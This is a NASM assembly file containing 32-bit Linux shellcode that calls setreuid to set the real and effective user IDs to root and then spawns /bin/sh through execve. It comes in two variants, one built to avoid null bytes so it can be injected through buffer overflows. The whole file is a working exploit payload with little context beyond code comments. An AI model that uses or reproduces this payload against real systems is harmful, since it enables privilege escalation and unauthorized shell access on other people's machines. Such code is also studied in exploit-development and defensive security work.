BITS 32

;
; 32-bit shellcode
; http://blog.markloiseau.com/2012/06/64-bit-linux-shellcode/
;

; set to 1 for output without nulls
%define NONULLS 1

%if NONULLS

GLOBAL _start

SECTION .data				; needs to be writable and executable
_start:
	; setreuid(ruid, euid)
	xor eax, eax
	add eax, 70				; 70 = setreuid
	xor ebx, ebx			; real userid
	xor ecx, ecx			; effective userid
	int 0x80
	
	jmp do_call				; get the address of our string
	
jmp_back:
	; execve(char *filename, char *argv[], char *envp[]);
	xor eax, eax
	add eax, 11				; 11 = execve
	pop ebx					; pop string address
	mov [ebx+7], byte ah	; put a null byte after /bin/sh (N)
	xor ecx, ecx			; char *argv[] = null
	xor edx, edx			; char *envp[] = null
	int 0x80
	
do_call:
	call jmp_back	; push the address of the string onto the stack

shell:
	db '/bin/shN'
	

%else

GLOBAL _start

SECTION .data				; needs to be writable and executable
_start:
	; setreuid(ruid, euid)
	xor eax, eax
	mov eax, 70				; 70 = setreuid
	xor ebx, ebx			; real userid
	xor ecx, ecx			; effective userid
	int 0x80
	
	jmp do_call				; get the address of our string
	
jmp_back:
	; execve(char *filename, char *argv[], char *envp[]);
	xor eax, eax
	mov eax, 11				; 11 = execve
	pop ebx					; pop string address
	mov [ebx+7], byte ah	; put a null byte after /bin/sh (N)
	xor ecx, ecx			; char *argv[] = null
	xor edx, edx			; char *envp[] = null
	int 0x80
	
do_call:
	call jmp_back	; push the address of the string onto the stack

shell:
	db '/bin/shN'
	
%endif
